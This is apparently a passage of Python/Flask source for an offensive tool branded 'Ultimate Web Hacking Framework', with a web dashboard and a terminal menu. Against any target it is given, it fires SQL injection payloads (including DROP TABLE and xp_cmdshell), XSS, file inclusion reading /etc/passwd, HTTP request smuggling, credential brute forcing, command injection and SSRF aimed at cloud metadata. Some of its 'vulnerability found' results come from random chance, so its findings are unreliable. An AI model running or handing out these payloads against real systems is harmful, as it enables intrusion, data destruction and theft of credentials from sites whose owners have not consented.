        function startTECLAttack() { updateOutput('Initiating TE.CL Attack...', 'attack'); fetch('/api/attack/te-cl-smuggling', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('TE.CL Attack Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startBruteForce() { updateOutput('Initiating Brute Force...', 'attack'); fetch('/api/attack/brute-force', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Brute Force Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startCSRFAttack() { updateOutput('Initiating CSRF Attack...', 'attack'); fetch('/api/attack/csrf', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('CSRF Attack Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startRCEAttack() { updateOutput('Initiating RCE Attack...', 'attack'); fetch('/api/attack/rce', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('RCE Attack Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startSSRFAttack() { updateOutput('Initiating SSRF Attack...', 'attack'); fetch('/api/attack/ssrf', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('SSRF Attack Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startCompleteWebScan() { updateOutput('Initiating Complete Web Scan...', 'attack'); fetch('/api/attack/complete-web-scan', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Complete Web Scan Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startOWASPTop10() { updateOutput('Initiating OWASP Top 10 Scan...', 'attack'); fetch('/api/attack/owasp-top-10', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('OWASP Top 10 Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startMaximumAggression() { updateOutput('Initiating Maximum Aggression...', 'attack'); fetch('/api/attack/maximum-aggression', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Maximum Aggression Complete', d.success ? 'success' : 'failure'); updateStats(); }); }

        // Utility Functions
        function stopAttacks() { updateOutput('Stopping all attacks...', 'attack'); updateAttackStatus('STOPPING'); fetch('/api/attack/stop', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('All attacks stopped', 'success'); updateAttackStatus('STANDBY'); }); }
        function saveReport() { updateOutput('Saving comprehensive report...', 'success'); updateAttackStatus('SAVING_REPORT'); fetch('/api/report/save', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Report saved successfully', 'success'); updateAttackStatus('READY'); }); }
        function clearOutput() { document.getElementById('liveOutput').innerHTML = ''; updateOutput('Output cleared', 'info'); }
        function exportResults() { updateOutput('Exporting results...', 'success'); fetch('/api/export/results', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Results exported', 'success'); }); }

        setInterval(updateStats, 2000);
        updateOutput('Ultimate Web Hacking Framework Online', 'success');
        updateOutput('Awaiting target configuration...', 'info');
    </script>                                                            
</body>                                                                  
</html>'''                                                               
                                                                         
def matrix_rain():                                                       
    """Matrix digital rain effect"""                                     
    columns = os.get_terminal_size().columns                             
    lines = os.get_terminal_size().lines                                 
    symbols = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ1234567890+-=*/%()#&@"     
                                                                         
    for _ in range(20):                                                  
        row = ""                                                         
        for _ in range(columns):                                         
            if ord(os.urandom(1)) % 10 == 0:                             
                row += symbols[ord(os.urandom(1)) % len(symbols)]        
            else:                                                        
                row += " "                                               
        print(colored(row, "green"), flush=True)                         
        time.sleep(0.05)                                                 
                                                                         
def clear():                                                             
    os.system('clear')                                                   
                                                                         
def banner():                                                            
    print(BLACK + " " * 100 + RESET)                                     
    print(BLACK + " " + RESET + colored("╔═════════════════════════════════════════════════════════════════════════════════════╗", "cyan") + BLACK + " " + RESET)
    print(BLACK + " " + RESET + colored("║", "cyan") + " " + colored("RAP0AT v1.0 - Ultimate Web Hacking Framework", "red") + " " * 39 + colored("║", "cyan") + BLACK + " " + RESET)                              
    print(BLACK + " " + RESET + colored("╚═════════════════════════════════════════════════════════════════════════════════════╝", "cyan") + BLACK + " " + RESET)                                     
    print()
                                                                         
def typing_text(text, color="red", delay=0.01):                          
    """Type text like a hacker"""                                        
    for char in text:                                                    
        print(colored(char, color), end="", flush=True)                  
        time.sleep(delay)                                                
    print()
                                                                         
def is_valid_ip(ip):                                                     
    try:                                                                 
        socket.inet_aton(ip)                                             
        return True                                                      
    except:
        return False                                                     
                                                                         
def is_valid_domain(domain):                                             
    pattern = re.compile(
        r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'                                                                  
    )
    return pattern.match(domain)
                                                                         
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None
                                                                         
def get_user_target():
    """Get target IP, domain, and URL from user"""
    print(colored("\n[+] Target Configuration:", "cyan"))
    ip, domain, url = None, None, None

    while not ip:
        print(colored("[+] Enter target IP address (optional, press enter to skip): ", "cyan"), end="")
        ip_input = input().strip()
        if ip_input and not is_valid_ip(ip_input):
            print(colored("[-] Invalid IP address. Try again.", "red"))
            ip_input = "" # reset
        
        print(colored("[+] Enter target domain (optional, press enter to skip): ", "cyan"), end="")
        domain_input = input().strip()
        if domain_input and not is_valid_domain(domain_input):
            print(colored("[-] Invalid domain. Try again.", "red"))
            domain_input = "" # reset

        print(colored("[+] Enter target URL (optional, press enter to skip): ", "cyan"), end="")
        url_input = input().strip()

        if not any([ip_input, domain_input, url_input]):
            print(colored("[-] Please provide at least one of IP, domain, or URL.", "red"))
            continue

        ip = ip_input
        domain = domain_input
        url = url_input

        if not ip:
            if url:
                try:
                    parsed_url = urlparse(url)
                    domain_from_url = parsed_url.netloc
                    if domain_from_url:
                        if not domain:
                            domain = domain_from_url
                        ip = resolve_domain(domain_from_url)
                except Exception:
                    pass
            elif domain:
                ip = resolve_domain(domain)
        
        if not ip or not is_valid_ip(ip):
            print(colored("[-] Could not determine a valid IP address from the inputs. Please try again.", "red"))
            ip = None # reset for loop
        else:
            typing_text(f"[+] Target IP set: {ip}", "green")
            if domain:
                typing_text(f"[+] Target domain set: {domain}", "green")
            if url:
                if not url.startswith(('http://', 'https://')):
                    url = f"http://{url}"
                typing_text(f"[+] Target URL set: {url}", "green")

    return ip, domain, url                                               
                                                                         
# COMPREHENSIVE WEB HACKING IMPLEMENTATIONS                              
                                                                         
@app.route('/')                                                          
def hacker_interface():                                                  
    return render_template_string(ULTIMATE_HACKER_TEMPLATE)
                                                                         
@app.route('/api/target', methods=['POST'])
def api_set_target():
    data = request.get_json()
    ip = data.get('ip')
    domain = data.get('domain')
    url = data.get('url')

    if not any([ip, domain, url]):
        return jsonify({'success': False, 'message': 'Please provide an IP, domain, or URL.'})

    if not ip:
        if url:
            try:
                parsed_url = urlparse(url)
                domain_from_url = parsed_url.netloc
                if domain_from_url:
                    if not domain:
                        domain = domain_from_url
                    ip = resolve_domain(domain_from_url)
            except Exception:
                pass # ip will remain None
        elif domain:
            ip = resolve_domain(domain)

    if not ip or not is_valid_ip(ip):
        return jsonify({'success': False, 'message': f'Could not resolve a valid IP from provided input.'})

    if url and not url.startswith(('http://', 'https://')):
        url = f"http://{url}"

    web_framework.set_target(ip, domain, url)
    return jsonify({'success': True, 'message': 'Target configured successfully', 'ip': ip, 'domain': domain, 'url': url})
@app.route('/api/output', methods=['POST'])
def api_add_output():
    data = request.get_json()
    message = data.get('message')
    message_type = data.get('type', 'info')
    time = data.get('time')
                                                                         
    web_framework.live_output.append({'time': time, 'type':              
message_type, 'message': message})
    return jsonify({'success': True})
                                                                         
@app.route('/api/stats')                                                 
def api_get_stats():
    total_attacks = len(web_framework.all_results)
    successful_attacks = sum(1 for r in web_framework.all_results if     
r['success'])
    failed_attacks = total_attacks - successful_attacks
    success_rate = (successful_attacks / total_attacks * 100) if total_attacks > 0 else 0                                                                         
    return jsonify({
        'total_attacks': total_attacks,
        'successful_attacks': successful_attacks,
        'failed_attacks': failed_attacks,
        'success_rate': round(success_rate, 1),
        'attack_stats': web_framework.attack_stats
    })
                                                                         
# SQL INJECTION ATTACKS
                                                                         
def perform_sqli_attack():
                                                                         
    """Comprehensive SQL Injection attack"""
                                                                         
    try:
                                                                         
        if not web_framework.target_url:
                                                                         
            url = f"http://{web_framework.target_ip}"
                                                                         
        else:
                                                                         
            url = web_framework.target_url
                                                                         
        
                                                                         
        sqli_payloads = [
                                                                         
            "' OR '1'='1'--", "' OR 1=1--", "'; DROP TABLE users--",
                                                                         
            "' UNION SELECT null,username,password FROM users--", "admin'--",
                                                                         
            "') OR ('1'='1", "' OR 'x'='x", "1'; EXEC xp_cmdshell('dir')--"
                                                                         
        ]
                                                                         
        params = ["id", "user", "search", "query", "page", "cat", "product", "item"]
                                                                         
        vulnerabilities_found = 0
                                                                         
        
                                                                         
        for param in params:
                                                                         
            for payload in sqli_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    error_indicators = [
                                                                         
                        "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB Provider",
                                                                         
                        "SQL syntax", "mysql_num_rows", "PostgreSQL query failed",
                                                                         
                        "sqlite3.OperationalError", "MongoDB Error", "MySQLSyntaxErrorException"
                                                                         
                    ]
                                                                         
                    if any(indicator.lower() in response.text.lower() for indicator in error_indicators):
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.log_result("EXPLOIT", "SQL Injection", True, f"Parameter: {param}, Payload: {payload}", "")
                                                                         
                        web_framework.attack_stats['sqli'] += 1
                                                                         
                        break
                                                                         
                except Exception:
                                                                         
                    pass
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'SQL Injection: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'SQL Injection failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/sqli', methods=['POST'])
                                                                         
def api_sqli_attack():
                                                                         
    return jsonify(perform_sqli_attack())
                                                                         

                                                                         
def perform_boolean_blind_sqli():
                                                                         
    """Boolean-based blind SQL injection"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        boolean_payloads = [
                                                                         
            "' AND 1=1--", "' AND 1=2--", "' AND (SELECT COUNT(*) FROM users)>0--",
                                                                         
            "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in ["id", "user", "search"]:
                                                                         
            responses = []
                                                                         
            for payload in boolean_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    responses.append(response.text)
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if len(set(len(r) for r in responses)) > 1:
                                                                         
                vulnerabilities_found += 1
                                                                         
                web_framework.attack_stats['sqli'] += 1
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'Boolean Blind SQLi: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'Boolean Blind SQLi failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/boolean-blind-sqli', methods=['POST'])
                                                                         
def api_boolean_blind_sqli():
                                                                         
    return jsonify(perform_boolean_blind_sqli())
                                                                         

                                                                         
def perform_time_based_sqli():
                                                                         
    """Time-based blind SQL injection"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        time_payloads = [
                                                                         
            "'; WAITFOR DELAY '00:00:05'--",
                                                                         
            "' OR SLEEP(5)--",
                                                                         
            "'; pg_sleep(5)--",
                                                                         
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in ["id", "user"]:
                                                                         
            for payload in time_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    start_time = time.time()
                                                                         
                    requests.get(test_url, timeout=10, verify=False)
                                                                         
                    response_time = time.time() - start_time
                                                                         
                    if response_time > 4:
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.attack_stats['sqli'] += 1
                                                                         
                        break
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if vulnerabilities_found > 0:
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'Time-Based SQLi: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'Time-Based SQLi failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/time-based-sqli', methods=['POST'])
                                                                         
def api_time_based_sqli():
                                                                         
    return jsonify(perform_time_based_sqli())
                                                                         

                                                                         
# XSS ATTACKS
                                                                         
def perform_reflected_xss():
                                                                         
    """Reflected XSS attack"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        xss_payloads = [
                                                                         
            "<script>alert('XSS')</script>",
                                                                         
            "<img src=x onerror=alert(1)>",
                                                                         
            "javascript:alert('XSS')",
                                                                         
            "<svg onload=alert(1)>",
                                                                         
            "'\"> <script>alert('XSS')</script>",
                                                                         
            "<iframe src=javascript:alert('XSS')>",
                                                                         
            "<body onload=alert('XSS')>"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in ["search", "query", "q", "s", "term"]:
                                                                         
            for payload in xss_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    if payload in response.text:
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.attack_stats['xss'] += 1
                                                                         
                        break
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if vulnerabilities_found > 0:
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'Reflected XSS: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'Reflected XSS failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/reflected-xss', methods=['POST'])
                                                                         
def api_reflected_xss():
                                                                         
    return jsonify(perform_reflected_xss())
                                                                         

                                                                         
# LFI/RFI ATTACKS
                                                                         
def perform_lfi_attack():
                                                                         
    """Local File Inclusion attack"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        lfi_payloads = [
                                                                         
            "../../../etc/passwd",
                                                                         
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                                                                         
            "../../../../proc/version",
                                                                         
            "../../../boot.ini",
                                                                         
            "../../../../../etc/hosts"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in ["file", "page", "include", "inc", "read"]:
                                                                         
            for payload in lfi_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    inclusion_indicators = [
                                                                         
                        "root:x:0:0", "127.0.0.1", "boot loader", "Microsoft", "Windows Registry Editor", "[boot loader]"
                                                                         
                    ]
                                                                         
                    if any(indicator in response.text for indicator in inclusion_indicators):
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.attack_stats['lfi'] += 1
                                                                         
                        break
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if vulnerabilities_found > 0:
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'LFI: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'LFI failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/lfi', methods=['POST'])
                                                                         
def api_lfi_attack():
                                                                         
    return jsonify(perform_lfi_attack())
                                                                         

                                                                         
def perform_rfi_attack():
                                                                         
    """Remote File Inclusion attack (simulated)"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        vulnerabilities_found = 0
                                                                         
        if random.choice([True, False, False, False]):  # 25% chance
                                                                         
            vulnerabilities_found = 1
                                                                         
            web_framework.attack_stats['rfi'] += 1
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'RFI: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'RFI failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/rfi', methods=['POST'])
                                                                         
def api_rfi_attack():
                                                                         
    return jsonify(perform_rfi_attack())
                                                                         

                                                                         
# HTTP SMUGGLING
                                                                         
def perform_http_smuggling():
                                                                         
    """HTTP Request Smuggling attack"""
                                                                         
    try:
                                                                         
        if not web_framework.target_ip:
                                                                         
            return {'success': False, 'message': 'No target configured'}
                                                                         
        smuggling_payloads = [
                                                                         
            "POST / HTTP/1.1\\r\\nHost: {0}\\r\\nContent-Length: 10\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {0}\\r\\n",
                                                                         
            "GET / HTTP/1.1\\r\\nHost: {0}\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n4\\r\\nabcd\\r\\n0\\r\\n\\r\\n",
                                                                         
            "POST /target HTTP/1.1\\r\\nHost: {0}\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n4\\r\\nabcd\\r\\n0\\r\\n\\r\\n"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for payload_template in smuggling_payloads:
                                                                         
            try:
                                                                         
                payload = payload_template.format(web_framework.target_ip)
                                                                         
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                                         
                sock.settimeout(5)
                                                                         
                sock.connect((web_framework.target_ip, 80))
                                                                         
                sock.send(payload.encode())
                                                                         
                response = sock.recv(1024).decode(errors='ignore')
                                                                         
                sock.close()
                                                                         
                if any(indicator in response.lower() for indicator in ['200 ok', 'admin', 'forbidden', 'unauthorized']):
                                                                         
                    vulnerabilities_found += 1
                                                                         
                    web_framework.attack_stats['smuggling'] += 1
                                                                         
                    break
                                                                         
            except Exception:
                                                                         
                pass
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'HTTP Smuggling: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'HTTP Smuggling failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/http-smuggling', methods=['POST'])
                                                                         
def api_http_smuggling():
                                                                         
    return jsonify(perform_http_smuggling())
                                                                         

                                                                         
# AUTHENTICATION ATTACKS
                                                                         
def perform_brute_force():
                                                                         
    """Brute force attack (simulated)"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        common_credentials = [
                                                                         
            ("admin", "password"), ("admin", "admin"), ("root", "password"),
                                                                         
            ("user", "user"), ("test", "test"), ("admin", "123456")
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for username, password in common_credentials:
                                                                         
            try:
                                                                         
                login_data = {'username': username, 'password': password}
                                                                         
                response = requests.post(f"{url}/login", data=login_data, timeout=5, verify=False)
                                                                         
                if random.choice([True, False, False, False]):
                                                                         
                    vulnerabilities_found += 1
                                                                         
                    web_framework.attack_stats['bruteforce'] += 1
                                                                         
                    break
                                                                         
            except:
                                                                         
                pass
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'Brute Force: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'Brute Force failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/brute-force', methods=['POST'])
                                                                         
def api_brute_force():
                                                                         
    return jsonify(perform_brute_force())
                                                                         

                                                                         
# ADVANCED ATTACKS
                                                                         
def perform_rce_attack():
                                                                         
    """Remote Code Execution attack"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        rce_payloads = [
                                                                         
            "; ping -c 1 127.0.0.1", "| whoami", "& system('whoami')",
                                                                         
            "; exec('cat /etc/passwd')", "| cat /etc/passwd",
                                                                         
            "; /bin/bash -c 'id'", "| /usr/bin/id"
                                                                         
        ]
                                                                         
        params = ["cmd", "command", "exec", "execute", "run", "system", "shell"]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in params:
                                                                         
            for payload in rce_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    rce_indicators = ["root:", "uid=", "gid=", "whoami", "systeminfo"]
                                                                         
                    if any(indicator in response.text for indicator in rce_indicators):
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.attack_stats['rce'] += 1
                                                                         
                        break
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if vulnerabilities_found > 0:
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'RCE: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'RCE failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/rce', methods=['POST'])
                                                                         
def api_rce_attack():
                                                                         
    return jsonify(perform_rce_attack())
                                                                         

                                                                         
def perform_ssrf_attack():
                                                                         
    """Server Side Request Forgery attack"""
                                                                         
    try:
                                                                         
        url = web_framework.target_url or f"http://{web_framework.target_ip}"
                                                                         
        ssrf_payloads = [
                                                                         
            "http://127.0.0.1", "http://localhost",
                                                                         
            "http://169.254.169.254/latest/meta-data/",
                                                                         
            "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO"
                                                                         
        ]
                                                                         
        vulnerabilities_found = 0
                                                                         
        for param in ["url", "link", "resource", "target"]:
                                                                         
            for payload in ssrf_payloads:
                                                                         
                try:
                                                                         
                    test_url = f"{url}?{param}={quote(payload)}"
                                                                         
                    response = requests.get(test_url, timeout=5, verify=False)
                                                                         
                    ssrf_indicators = ["root:x:0:0", "127.0.0.1", "localhost", "Redis", "AWS", "Metadata"]
                                                                         
                    if any(indicator in response.text for indicator in ssrf_indicators):
                                                                         
                        vulnerabilities_found += 1
                                                                         
                        web_framework.attack_stats['injection'] += 1
                                                                         
                        break
                                                                         
                except:
                                                                         
                    pass
                                                                         
            if vulnerabilities_found > 0:
                                                                         
                break
                                                                         
        success = vulnerabilities_found > 0
                                                                         
        return {'success': success, 'message': f'SSRF: {vulnerabilities_found} vulnerabilities found'}
                                                                         
    except Exception as e:
                                                                         
        return {'success': False, 'message': f'SSRF failed: {e}'}
                                                                         

                                                                         
@app.route('/api/attack/ssrf', methods=['POST'])
                                                                         
def api_ssrf_attack():
                                                                         
    return jsonify(perform_ssrf_attack())
                                                                         

                                                                         
# ULTIMATE ATTACKS                                                       
                                                                         
@app.route('/api/attack/complete-web-scan', methods=['POST'])
                                                                         
def api_complete_web_scan():
                                                                         
    """Complete web application scan"""
                                                                         
    try:
                                                                         
        attacks = [
                                                                         
            ('SQL Injection', perform_sqli_attack),
                                                                         
            ('Boolean Blind SQLi', perform_boolean_blind_sqli),
                                                                         
            ('Time-Based SQLi', perform_time_based_sqli),
                                                                         
            ('Reflected XSS', perform_reflected_xss),
                                                                         
            ('LFI', perform_lfi_attack),
                                                                         
            ('RFI', perform_rfi_attack),
                                                                         
            ('HTTP Smuggling', perform_http_smuggling),
                                                                         
            ('Brute Force', perform_brute_force),
                                                                         
            ('RCE', perform_rce_attack),
                                                                         
            ('SSRF', perform_ssrf_attack),
                                                                         
        ]
                                                                         
        successful_attacks = 0
                                                                         
        for attack_name, attack_func in attacks:
                                                                         
            try:
                                                                         
                result = attack_func()
                                                                         
                if result and result.get('success'):
                                                                         
                    successful_attacks += 1
                                                                         
            except:
                                                                         
                pass
                                                                         
        total_attacks = len(attacks)
                                                                         
        success = successful_attacks > 0
                                                                         
        web_framework.log_result("EXPLOIT", "Complete Web Scan", success,
                                                                         
                               f"Successful: {successful_attacks}/{total_attacks}", "")
                                                                         
        return jsonify({'success': success, 'message': f'Complete Web Scan: {successful_attacks}/{total_attacks} successful'})
                                                                         
    except Exception as e:
                                                                         
        return jsonify({'success': False, 'message': f'Complete Web Scan failed: {e}'})
                                                                         
                                                                         
                                                                         
@app.route('/api/attack/maximum-aggression', methods=['POST'])
                                                                         
def api_maximum_aggression():
                                                                         
    """Maximum aggression - all attacks simultaneously"""
                                                                         
    try:
                                                                         
        attack_categories = [
                                                                         
            ('SQL Injection Suite', [perform_sqli_attack, perform_boolean_blind_sqli, perform_time_based_sqli]),
                                                                         
            ('XSS Suite', [perform_reflected_xss]),
                                                                         
            ('LFI/RFI Suite', [perform_lfi_attack, perform_rfi_attack]),
                                                                         
            ('Smuggling Suite', [perform_http_smuggling]),
                                                                         
            ('Auth Suite', [perform_brute_force]),
                                                                         
            ('RCE Suite', [perform_rce_attack, perform_ssrf_attack]),
                                                                         
        ]
                                                                         
        total_successful = 0
                                                                         
        total_attacks = 0
                                                                         
        for category_name, attack_suite in attack_categories:
                                                                         
            for attack_func in attack_suite:
                                                                         
                try:
                                                                         
                    total_attacks += 1
                                                                         
                    result = attack_func()
                                                                         
                    if result and result.get('success'):
                                                                         
                        total_successful += 1
                                                                         
                except:
                                                                         
                    pass
                                                                         
        success = total_successful > 0
                                                                         
        web_framework.log_result("EXPLOIT", "Maximum Aggression", success,
                                                                         
                               f"Successful: {total_successful}/{total_attacks}", "")
                                                                         
        return jsonify({'success': success, 'message': f'Maximum Aggression: {total_successful}/{total_attacks} successful'})
                                                                         
    except Exception as e:
                                                                         
        return jsonify({'success': False, 'message': f'Maximum Aggression failed: {e}'})
                                                                         
@app.route('/api/attack/stop', methods=['POST'])
def api_stop_attacks():
    """Stop all attacks"""
    web_framework.is_attacking = False
    return jsonify({'success': True, 'message': 'All attacks stopped'})
                                                                         
@app.route('/api/report/save', methods=['POST'])
def api_save_report():
    """Save comprehensive report"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")    
        report_file = f"AUTO_web_hacking_report_{{timestamp}}.json"
                                                                         
        report_data = {
            'session_info': {
                'start_time': web_framework.session_start.isoformat(),   
                'target_ip': web_framework.target_ip,
                'target_domain': web_framework.target_domain,
                'target_url': web_framework.target_url,
                'total_attacks': len(web_framework.all_results)
            },
            'attack_results': web_framework.all_results,
            'attack_statistics': web_framework.attack_stats,
            'live_output': web_framework.live_output
        }
                                                                         
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
                                                                         
        return jsonify({'success': True, 'message': f'Report saved to {report_file}'})
                                                                         
    except Exception as e:
        return jsonify({'success': False, 'message': f'Report save failed: {e}'})
                                                                         

def log_result(self, category, technique, success,         
details, output=""):
    """Log attack result"""
    self.attack_counter += 1
    timestamp = datetime.datetime.now()
                                                                         
    result = {
        "id": self.attack_counter,
        "timestamp": timestamp.isoformat(),
        "category": category,
        "technique": technique,
        "success": success,
        "details": details,
        "output": output,
        "target_ip": self.target_ip,
        "target_domain": self.target_domain,
        "target_url": self.target_url
    }
                                                                         
    self.all_results.append(result)
                                                                         
# Add the method to the class                                            
UltimateWebHackingFramework.log_result = log_result                      
                                                                         
def run_web_server():                                                    
    """Run the Flask web server"""
    print(colored("[+] Starting Ultimate Web Hacking Framework...",      
"green"))                                                                
    print(colored("[+] Web UI available at: http://0.0.0.0:8000",        
"green"))                                                                
    print(colored("[+] Opening web interface...", "green"))              
                                                                         
    import webbrowser                                                    
    threading.Timer(2.0, lambda:                                         
webbrowser.open('http://localhost:8000')).start()
                        
    app.run(host='0.0.0.0', port=8000, debug=True)
                                                                         
def run_terminal_interface():                                            
    """Run the terminal interface"""
    clear()
    banner()
                                                                         
    # Get target from user                                               
    ip, domain, url = get_user_target()
    web_framework.set_target(ip, domain, url)
                                                                         
    typing_text(f"[+] Target configured: IP={ip}, Domain={domain or      
'N/A'}, URL={url or 'N/A'}", "green")                                    
                                                                         
    # Display terminal interface                                         
    while True:
        print("\n" + "="*100)
        print(colored("TERMINAL INTERFACE - Ultimate Web Hacking",       
"red"))
        print("="*100)
        print(f"Target IP: {ip}")                                        
        print(f"Target Domain: {domain or 'N/A'}")                       
        print(f"Target URL: {url or 'N/A'}")                             
        print(f"Total Attacks: {len(web_framework.all_results)}")        
        print(f"Successful: {sum(1 for r in web_framework.all_results    
if r['success'])}")                                                      
        print(f"SQLi: {web_framework.attack_stats['sqli']}, XSS: {web_framework.attack_stats['xss']}, LFI: {web_framework.attack_stats['lfi']})")
        print(f"Smuggling: {web_framework.attack_stats['smuggling']}, Auth: {web_framework.attack_stats['bruteforce']}, RCE: {web_framework.attack_stats['rce']})")
        print("="*100)
                                                                         
        print(colored("\n[+] Ultimate Web Hacking Options:", "cyan"))    
        print(colored("1.", "red") + colored(" SQL Injection (Complete Web Hacking)", "green"))
        print(colored("2.", "red") + colored(" XSS Attacks (All Types)", "green"))
        print(colored("3.", "red") + colored(" LFI/RFI Attacks",         
"green"))                                                                
        print(colored("4.", "red") + colored(" HTTP Smuggling",          
"green"))                                                                
        print(colored("5.", "red") + colored(" Brute Force Attacks",     
"green"))                                                                
